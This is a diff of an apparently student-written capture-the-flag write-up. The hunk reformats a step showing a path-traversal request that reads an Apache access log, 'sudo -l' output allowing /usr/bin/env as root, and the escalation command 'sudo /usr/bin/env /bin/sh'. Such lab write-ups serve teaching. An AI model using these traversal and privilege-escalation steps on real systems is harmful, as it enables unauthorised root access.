@@ -283,13 +283,15 @@ view-source:http://<IP>/index.php?view=cat/../../../../../var/log/apache2/access
 ```
 
 + FLAG3:
- + Firs, we use "sudo -l" in cmd and we get ouput: 
- '10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "Matching Defaults entries for www-data on 42905e333fcc:
+ + Firs, we use "sudo -l" in cmd and we get ouput:
+```bash
+ 10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "Matching Defaults entries for www-data on 42905e333fcc:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User www-data may run the following commands on 42905e333fcc:
     (root) NOPASSWD: /usr/bin/env
 "'
+```
 
 + We run " sudo /usr/bin/env /bin/sh" to priv but we can get the root.
 + Problem: After try command 'cd, wget' in cmd, we can not get respone from server because some command is filtered in cmd by server.
